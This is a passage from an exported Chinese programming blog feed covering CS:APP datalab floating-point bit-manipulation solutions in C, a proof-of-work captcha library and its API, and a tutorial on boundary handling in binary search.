<h2 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h2><p>描述:将浮点数翻倍</p>
<p>可用操作：包括任何整数或者无符号操作，以及”||”、”&amp;&amp;”，if语句，while语句。</p>
<p>操作符上限：30</p>
<p>浮点数可以表示成：<br>$$<br>v=(-1)^s<em>2^e</em>M<br>$$<br>Ieee浮点数中，有4中类型的浮点数：</p>
<ul>
<li>规格化数：阶码非全1且非全 0</li>
<li>非规格化数：阶码全0</li>
<li>无穷大：阶码全1、尾数全0</li>
<li>NaN：阶码全1、尾数非全0</li>
</ul>
<p>对于无穷大，乘以2还是无穷大，对于NaN，乘以2还是NaN。</p>
<p>对于非规格化数，由于阶码部分是固定的（全 0），我们直接对其移位即可完成乘2的运算，当然这个过程中有可能使得它变为规格化数，但是不影响。</p>
<p>对于规格化数,一般情况下阶码加一即可，但是如果加一后如果阶码变成了全1时候，要修改尾数，使得整个值为无穷大</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 单精度浮点数 |1|  8 |    23       |</span></span><br><span class="line">    <span class="comment">// 阶码，尾数</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span>, m, newExp;</span><br><span class="line">    <span class="built_in">exp</span> = uf &amp; <span class="number">0x7f800000</span>;</span><br><span class="line">    m = uf &amp; <span class="number">0x007fffff</span>;</span><br><span class="line">    <span class="comment">// 无穷大  和 NaN</span></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">exp</span> ^ (<span class="number">0x7f800000</span>)))&#123;</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 非规格化数</span></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="built_in">exp</span> ^ <span class="number">0</span>))&#123;</span><br><span class="line">        <span class="comment">// 要保留原先符号</span></span><br><span class="line">        <span class="keyword">return</span> (uf &amp; <span class="number">0x80000000</span>) | ((uf &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 规格化数,一般情况下阶码加一即可，</span></span><br><span class="line">    <span class="comment">// 但是如果加一后如果阶码变成了全1时候，要修改尾数，使得整个值为无穷大</span></span><br><span class="line">    newExp = <span class="built_in">exp</span> + <span class="number">0x00800000</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(newExp ^ (<span class="number">0x7f800000</span>)))&#123;</span><br><span class="line">        <span class="keyword">return</span> (uf &amp; <span class="number">0x80000000</span>) | <span class="number">0x7f800000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (uf &amp; <span class="number">0x80000000</span>) | (newExp + m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h2><p>描述:将浮点数强制转为int</p>
<p>可用操作：包括任何整数或者无符号操作，以及”||”、”&amp;&amp;”，if语句，while语句。</p>
<p>操作符上限：30</p>
<p>对于超出int范围的，我们可用直接返回0x80000000；</p>
<p>对于非规格化数，它们都是小于1的，因此直接返回0即可。</p>
<p>对于规格化数，我们要注意，尾数实际上隐含了整数部分的1。</p>
<p>为了将规格化数转为整数，我们可以使用“缩小阶码，往右移动小数点”的方式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span>, m, actuallyExp, intV;</span><br><span class="line">    <span class="built_in">exp</span> = uf &amp; <span class="number">0x7f800000</span>;</span><br><span class="line">    m = uf &amp; <span class="number">0x007fffff</span>;</span><br><span class="line">    <span class="comment">// 无穷大  和 NaN</span></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">exp</span> ^ (<span class="number">0x7f800000</span>)))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 非规格化数</span></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">exp</span> ^ <span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 规格化数，由于规格化数实际上是2^&#123;e&#125;*1.M</span></span><br><span class="line">    <span class="comment">// 因此强制转化时候，我们只需要将小数点往右边移动一定位置就行</span></span><br><span class="line">    <span class="comment">// 至于移动多少，取绝与阶码代表的含义，</span></span><br><span class="line">    <span class="comment">// IEEE单精度规格化数的实际阶码代表是 e-127</span></span><br><span class="line">    actuallyExp = (<span class="built_in">exp</span> &gt;&gt; <span class="number">23</span>) - <span class="number">127</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 actuallyExp 是一个负数，则说明是小于1的数字，直接返回0即可</span></span><br><span class="line">    <span class="keyword">if</span> (actuallyExp &amp; <span class="number">0x80000000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 如果有舍入，即 actuallyExp  小于24</span></span><br><span class="line">    <span class="comment">// (实际上等于23时候并不是需要舍入，只不过是为了计算方便)</span></span><br><span class="line">    <span class="keyword">if</span> ((actuallyExp - <span class="number">24</span>) &amp; <span class="number">0x80000000</span>)&#123;</span><br><span class="line">        intV = (<span class="number">1</span> &lt;&lt; actuallyExp) + (m &gt;&gt; (<span class="number">23</span> - actuallyExp));</span><br><span class="line">        <span class="comment">// 判断正负</span></span><br><span class="line">        <span class="keyword">if</span> ((uf &amp; <span class="number">0x80000000</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> ~intV + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> intV;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 如果actuallyExp 大于等于31，则溢出，因为int只能表示31位整数</span></span><br><span class="line">        <span class="comment">// 而规则化数隐含了小数点前的1，因此后面最多能放30个数字</span></span><br><span class="line">        <span class="keyword">if</span> (!((actuallyExp - <span class="number">31</span>) &amp; <span class="number">0x80000000</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        intV = (<span class="number">1</span> &lt;&lt; actuallyExp) + (m &lt;&lt; (actuallyExp - <span class="number">23</span>));</span><br><span class="line">        <span class="comment">// 判断正负</span></span><br><span class="line">        <span class="keyword">if</span> ((uf &amp; <span class="number">0x80000000</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> ~intV + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> intV;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h2><p>描述：计算2^x，返回浮点数</p>
<p>可用操作：包括任何整数或者无符号操作，以及”||”、”&amp;&amp;”，if语句，while语句。</p>
<p>操作符上限：30</p>
<p>最大浮点数是：1.9999998808 X 2^(127)，因此如果x大于等于128，则直接返回无穷大即可.</p>
<p>当浮点数非常接近0的时候（即x小于等于-128），其表现形式是非规格化数，因此按照题目要求，我们可直接返回0 .</p>
<p>在其他情况下，我们需要将阶码加上偏置值 127 ，就可以得到2^x次幂了，尾数我们不用管，直接置零即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ex;</span><br><span class="line">	<span class="keyword">if</span>(x &gt;= <span class="number">128</span>)<span class="keyword">return</span> <span class="number">0x7f800000</span>;</span><br><span class="line">    <span class="comment">// 如果小于-127（即小于等于-128），返回0</span></span><br><span class="line">    <span class="keyword">if</span>(x &lt;= <span class="number">-128</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ex =  x + <span class="number">127</span>;</span><br><span class="line">    <span class="comment">// 规格化数</span></span><br><span class="line">    <span class="keyword">return</span> ex &lt;&lt; <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>离散数学真是个神奇的东西，很多公式之间可以相互转换</li>
<li>浮点数有点东西！以精度换取范围</li>
</ul>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP3e系列实验预告</title>
    <url>/2023/07/31/CS-APP3e%E7%B3%BB%E5%88%97%E5%AE%9E%E9%AA%8C%E9%A2%84%E5%91%8A/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早就听说了国外经典教材《深入理解计算机系统》很出名，配套实验<code>CS:APP3e</code>更是一绝，但是之前一直没有拜读过，最近利用别人喝咖啡的时间简单阅读了一下，感觉良好！内容充实！收获颇丰！</p>
<p>特别是上手实验的时候，有种相见恨晚的感觉，遂把实验过程记录下来，也当作一个勉励自己的方式（寒暑假加油！！加班加点！！）。</p>
<p>当然时间精力有限，短时间内定然无法完成通读+复现试验，因此本人打算给一个期限，三年之内一定把所有实验完成！</p>
<blockquote>
<p>好家伙，还不如不给时间限定呢，三年时间也太多了（<del>莫怪我，我只能每周抽点时间出来做实验</del>）</p>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>全部完成后再来写这部分吧！</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>基于工作量证明（PoW）的验证码系统的简单实现</title>
    <url>/2023/06/19/%E5%9F%BA%E4%BA%8E%E5%B7%A5%E4%BD%9C%E9%87%8F%E8%AF%81%E6%98%8E%EF%BC%88POW%EF%BC%89%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CAPTCHA全称Completely Automated Public Turing Test，译为全自动区分计算机和人类的图灵测试，是指各种认证方法，这些方法利用一个对于人类来说很简单但对机器来说很难的挑战来测试用户，以验证用户是否为人类。<a id="more"></a></p>
<p>随着人工智能技术不断发展，许多传统的验证码测试系统被计算机轻易通过，因此许多厂商不断推出各种创新性的方法，然而大多数情况下机器根据一些标注数据进行训练后，也能够快速适应新的这些系统，反倒是对于用户而言，要花时间学习新的验证方式，徒增客户烦恼。</p>
<p>现在的一些验证码过于奇葩，例如：</p>
<p><img src="https://cdn.yalexin.top/image-20230619102235861.png" alt="image-20230619102235861"></p>
<p><img src="https://cdn.yalexin.top/image-20230619102252640.png" alt="image-20230619102252640"></p>
<p><img src="https://cdn.yalexin.top/image-20230619102438119.png" alt="image-20230619102438119"></p>
<p>在我看来，现在的验证码系统多多少少有些本末倒置了，把人类难住了，计算机却放过了。</p>
<p>因此有必要对现有的验证码系统做出改进。</p>
<h2 id="工作量证明POW"><a href="#工作量证明POW" class="headerlink" title="工作量证明POW"></a>工作量证明POW</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>工作量证明即在获取我的服务之前，你需要向我证明你做了一定量的工作。</p>
<p>很常用的一种方法是通过寻找哈希值的方式，即你花费算力，寻找某些特定条件的哈希值，由于哈希函数的不可逆性和不可预测性，你不得不通过迭代的方式进行寻找，但是对于我而言，验证过程是很容易的，只需要将你给的值计算一遍哈希值，检查哈希值是否符合条件，只要符合条件，就说明你的确做了一定量的工作。</p>
<p>为了防止你使用彩虹表的方式记录下指定字符串的哈希值，我要给一个随机字符串<code>prefix</code>，你再在这基础之上寻找一个后缀，使得两者拼接后的哈希值符合条件。</p>
<p>以上就是一个简单的基于pow的验证码系统的大致原理了，下面是实现过程</p>
<blockquote>
<p>好吧，我承认这篇文章的确有些标题党了，这个方式并不是真正意义上的captcha，因为它并没有往区分人类与机器人的功能上走，但是今天的验证码系统的目的是什么？绝大多数是为了防止机器人访问吧，例如在登录页面放入验证码系统，防止机器人通过口令爆破的方式获取指定用户的密码，即先判断是人类，再判断输入的密码，因为人类输入内容速度较慢，以人工的方式爆破密码不现实。</p>
<p>而基于pow的系统，我并不关心访问者是人类还是机器，因为在验证你提交的密码之前，我先验证你的工作量，也可以说是“浪费”你的算力，对于人类而言，反正这个工作是计算机进行，用户无需干预，只需等一小会即可，反观机器人，为了爆破密码，每次提交不同的密码之前，都要花费一定时间解决pow难题，这么算下来，爆破速度和人类手工爆破速度一致，为了获取真实密码，花费的时间成本太大，那还不如不爆破了。</p>
<p>什么，你说美国人想用混合精度高达每秒1,000,000,000,000,000,000次的目前超算能力排名第一的超计算机Frontier来爆破我的博客系统管理员密码？</p>
<p>从这个意义上来说，基于pow的也算得上是一个称职的验证码系统，因为的确达到了减缓机器人爆破的目的，只不过这个验证码是一个哈希值，是由计算机去计算的，无需用户干预，提升了用户体验。</p>
</blockquote>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>为了实现这个过程，需要客户端和服务端共同努力，整个流程如下图：</p>
<p><img src="https://cdn.yalexin.top/image-20230619112607571.png" alt="image-20230619112607571"></p>
<p>首先客户端要请求服务端，服务端随机生成前缀字符串<code>prefix</code>，将该字符串连同困难度<code>difficult</code>返回给客户端，客户端以迭代方式计算后缀，使得前后缀的哈希值符合条件，然后将后缀以及对应的哈希值提交给服务端，服务端再结合之前生成的前缀，验证这个后缀是否符合条件，一方面,如果符合条件，在session中标记,然后通知客户端可以提交密码，收到用户提交的密码时候,第一件事就是判断session中有无标记,避免用户不进行pow而直接提交密码;另一方面,如果验证不通过,则重新生成一个随机前缀，重复上述步骤.</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>目前客户端实现已开源至<a href="https://github.com/YaleXin/pow-captcha-js" target="_blank" rel="noopener">GitHub</a></p>
<p>可以根据下面的步骤使用:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/YaleXin/pow-captcha-js</span><br><span class="line">npm install</span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure>

<p>运行上述命令后,将会在<code>dist</code>目录下产生<code>pow-captcha-js.js</code>,将其复制到你需要的项目中即可,例如在Vue项目中,将其复制到目录<code>static/js/</code>,在代码中使用:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">import</span> &#123; Captcha &#125; <span class="keyword">from</span> <span class="string">"../../static/js/pow-captcha-js.js"</span></span><br><span class="line">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">      mounted() &#123;</span><br><span class="line">        <span class="keyword">this</span>.pow();</span><br><span class="line">      &#125;,</span><br><span class="line">      methods: &#123;</span><br><span class="line">      	pow() &#123;</span><br><span class="line">		  <span class="keyword">const</span> CONFIG_URL = <span class="string">'/api/admin/powConfig'</span>;</span><br><span class="line">          <span class="keyword">const</span> VERIFY_URL = <span class="string">'/api/admin/powVerify'</span></span><br><span class="line">          <span class="keyword">const</span> cpt = <span class="keyword">new</span> Captcha();</span><br><span class="line">          cpt.start(CONFIG_URL, VERIFY_URL).then(<span class="function"><span class="params">resobj</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'obj==&gt;'</span>, resobj);</span><br><span class="line">          &#125;).catch(<span class="function"><span class="params">e</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'pow e =&gt;'</span>, e);</span><br><span class="line">          &#125;)</span><br><span class="line">    	&#125;,</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>服务端必须实现两个接口:<code>CONFIG_URL</code>和<code>VERIFY_URL</code></p>
<p>在<code>CONFIG_URL</code>接口中,需要返回一个json数据,格式如下:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"difficulty"</span>:<span class="number">5</span>,</span><br><span class="line">    <span class="attr">"prefix"</span>:<span class="string">"Ve03Plle"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>VERIFY_URL</code>接口中,需要接收一个json数据(该数据由客户端以post方式提交),格式如下:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"data"</span>:&#123;</span><br><span class="line">        <span class="attr">"md5Str"</span>:<span class="string">"00000119414c7a8c9678b96fbc4954be"</span>,</span><br><span class="line">        <span class="attr">"paddingNum"</span>:<span class="number">300880</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>paddingNum</code>即用户暴力迭代寻找到的后缀.</p>
<p>服务端要在这个接口中完成两个验证:</p>
<ol>
<li><code>md5Str==md5(prefix+paddingNum)</code></li>
<li><code>md5Str</code>前导零个数至少是 <code>difficulty</code></li>
</ol>
<p><code>difficulty</code> 和 <code>prefix</code> 对应于在接口<code>CONFIG_URL</code>中返回的内容.</p>
<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p><code>Captcha.start()</code>会返回一个promise对象,如果通过验证,则会在<code>then</code>中返回一个对象<code>resobj</code>,该对象内容如下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    verify: <span class="literal">true</span>, </span><br><span class="line">    tryServerCnt: tryServerCnt,</span><br><span class="line">    totalTryCnt: totalTryCnt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">字段</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">verify</td>
<td align="center">服务端验证结果</td>
</tr>
<tr>
<td align="center">totalTryCnt</td>
<td align="center">总迭代次数</td>
</tr>
</tbody></table>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前前端代码是单线程的,未来将考虑使用多线程.</p>
<p>其实我一开始就是以多线程的方式是写的,当时是用<code>worker_threads</code>,但是打包过程发现我才发现这包是在<code>nodejs</code>环境下的,在浏览器环境下无法执行,只好换成<code>Web Worker</code>的方式,但是这种方式对于传入的脚本有同源限制,打包后总是提示找不到对应的<code>worker.js</code>.最后不得不使用单线程的方式.</p>
<p>未来看一下怎么用借助<code>webpack</code> 的<code>worker loader</code>解决使用<code>worker</code>遇到的问题.</p>
<hr>
<ul>
<li>2023-06-20更新：✔ 已借助webpack完成多线程重塑代码</li>
</ul>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>PoW</tag>
      </tags>
  </entry>
  <entry>
    <title>关于二分算法中的边界问题的思考</title>
    <url>/2023/05/04/%E5%85%B3%E4%BA%8E%E4%BA%8C%E5%88%86%E7%AE%97%E6%B3%95%E4%B8%AD%E7%9A%84%E8%BE%B9%E7%95%8C%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于二分算法，在理解方面不难理解，但是在实现的细节上面，我们往往要对边界处理过程要加以小心，否则有可能使得最终输出并不是问题的解，虽然二者极度相似，甚至在比较差的情况之下直接导致死循环。</p>
<a id="more"></a>

<h2 id="问题抽象建模"><a href="#问题抽象建模" class="headerlink" title="问题抽象建模"></a>问题抽象建模</h2><p>本文所说的二分算法，和二分查找算法有些区别，即在给定的一个区间，左边若干连续长度内是满足一定条件的，右边若干连续长度内都是不满足该条件的，<strong>我们要求出这个分界点</strong>。</p>
<p>通过暴力法，我们可以直接简单地从区间的最小值进行迭代，该时间复杂度为$O(n*T)$，<code>n</code>是区间长度，$T$是判断指定数字是否满足条件的花销。</p>
<p>然而，如果区间非常大，那么上述过程可能会变得非常慢。</p>
<p>实际上，由于区间左部分是相同性质的，右边也是具有另一个性质，我们可以使用二分法，即每次使用区间的中间值去判断，如果中间值表现出和左边一致，则这个分界点一定在中间值的右边，即我们把要检查的区间长度将为原来的<strong>一半。</strong>这个过程时间复杂度可以降为$O(log(n)*T)$</p>
<p><img src="https://cdn.yalexin.top/2fenp1.png" alt="2fenp1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool check(check_num):</span><br><span class="line">	&#x2F;&#x2F; 根据一定逻辑，判断 check_num 是在左区间还是右区间</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#x2F;&#x2F; 二分算法</span><br><span class="line">int bin()&#123;</span><br><span class="line">	left, right &#x3D; MIN,MAX</span><br><span class="line">	while 区间可分 do:</span><br><span class="line">		mid &#x3D; (left + right) &#x2F; 2</span><br><span class="line">		if check(mid) 更新左区间边界（或右区间边界）</span><br><span class="line">		else 更新右区间边界（或左区间边界）</span><br><span class="line">	</span><br><span class="line">	return left 或者 right	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上，二分查找通常有三种细节略有不同的实现方式：左闭右闭、左闭右开和左开右闭，下面结合基本例子，分别讲述这三种情况下的实现方式。</p>
<blockquote>
<p>阿珍和阿强是一对情侣，他们在玩一个游戏，阿珍先在心里默念一个数字target，范围是1到2147483647，然后要阿强猜出这个数字是多少，每次阿强猜一个数字num的时候，阿珍只会回答num“小于等于”或者”大于”target，但是我们知道每个人的耐心是有限的，阿强能够在40次之间将这个数字猜中，从而他们今晚能够出去看月亮吗？</p>
</blockquote>
<h2 id="左闭右闭"><a href="#左闭右闭" class="headerlink" title="左闭右闭"></a>左闭右闭</h2><p>我们先将该问题抽象成之前的问题，即对于在<code>[1,target]</code>中的数字都是满足“小于等于target”条件的，<code>[target+1,INF]</code>中的数字都是不满足“小于等于target”条件的，<strong>而满足该条件的最大值</strong>，就是我们的目标值。</p>
<p>关于二分求解，大致的程序如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> check_num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(check_num &lt;= TARGET)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left, right = MIN,MAX</span><br><span class="line">	<span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(mid))&#123;</span><br><span class="line">            left = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于我们定义<code>target</code> 是在一个在左闭右闭的区间里，也就是 <code>[left, right]</code>。那么就要满足：</p>
<ul>
<li><p>区间可分逻辑：<code>while(left &lt; right)</code></p>
</li>
<li><p>更新区间边界逻辑：如果<code>check(mid)</code>返回值是真，则<code>[left,mid]</code>中的所有元素也一定能够满足“小于等于target”条件，但是满足条件的最大值应该在<code>[mid,right]</code>中，不可能在<code>[left,mid-1]</code>中，因此<code>left = mid</code>；反之，如果其返回值是假，则说明满足条件的最大值不可能在<code>[mid,right]</code>中，因此<code>right = mid - 1</code>；</p>
</li>
<li><p>关于<code>mid</code>的计算方式：<code>mid</code>作用是不断减小区间长度，当区间长度不小的时候，向上取整和向下取整都是无关紧要的，我们只需要关注当区间只有两个元素时候，该如何计算<code>mid</code>？我们使用逆推的思想，由于我们更新区间的方式中，存在<code>left = mid</code>，假设我们是向下取整，left=2,right=3，那么mid是2，即mid=left，而left是一定满足check函数的条件，即将出现死循环！因此我们应该是向上取整。</p>
</li>
</ul>
<p>假如我们要转换为<strong>满足条件的最小值</strong>，如何求解？即我们将条件转为“<strong>大于等于target</strong>”，实际上，也只需要将相应程序改为：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> check_num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(check_num &gt;= TARGET)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = MIN, right = MAX;</span><br><span class="line">	<span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right ) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(mid))&#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>区间可分逻辑：<code>while(left &lt; right)</code></p>
</li>
<li><p>更新区间边界逻辑：如果<code>check(mid)</code>返回值是真，则<code>[mid,right]</code>中的所有元素也一定能够满足“大于等于target”条件，但是满足条件的最大值应该在<code>[left,mid]</code>中，不可能在<code>[mid + 1,right]</code>中，因此<code>right = mid</code>；反之，如果其返回值是假，则说明满足条件的最大值不可能在<code>[left,mid]</code>中，因此<code>left= mid + 1</code>；</p>
</li>
<li><p>关于<code>mid</code>的计算方式：我们使用逆推的思想，由于我们更新区间的方式中，存在<code>right = mid</code>，假设我们是向上取整，left=2,right=3，那么mid是2，即mid=left，而right是一定满足check函数的条件，即将出现死循环！因此我们应该是向下取整。</p>
</li>
</ul>
<blockquote>
<p>简单来说，更新区间时候，如果是left=mid，则向上取整，否则向下取整。</p>
</blockquote>
<h2 id="左闭右开"><a href="#左闭右开" class="headerlink" title="左闭右开"></a>左闭右开</h2><p>此时，我们的<code>target</code>定义在左闭右开，即<code>[left,right)</code>中，还是先以满足条件的最大值为例，测试条件为“小于等于target”，即<code>[left,right-1]</code>中的元素都满足条件，但是<code>right</code>不满足！<strong>明白这点很重要！</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> check_num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(check_num &lt;= TARGET)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = MIN, right = MAX;</span><br><span class="line">	<span class="keyword">while</span> (left + <span class="number">1</span> &lt; right)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(mid))&#123;</span><br><span class="line">            left = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>区间可分逻辑：<code>while(left + 1&lt; right)</code>，为什么呢？因为我们的区间是开区间，左边边界永远不会等于右边边界，最小差值为1.</li>
<li>更新区间边界逻辑：如果<code>check(mid)</code>返回值是真，则<code>[left,mid]</code>中的所有元素也一定能够满足“小于等于target”条件，但是满足条件的最大值应该在<code>[mid,right]</code>中，不可能在<code>[left,mid-1]</code>中，因此<code>left = mid</code>；反之，如果其返回值是假，则说明满足条件的最大值不可能在<code>[mid,right]</code>中，因此<code>right = mid</code>；<strong>注意，我们新的区间仍然要满足开区间的定义！即右边节点不满足条件</strong></li>
<li>关于<code>mid</code>的计算方式：由于是使用左闭右开的思想，即一旦满足<code>left + 1 == right</code>条件，此时就会跳出循环，因此向上取整和向下取整，都无关紧要了。</li>
</ul>
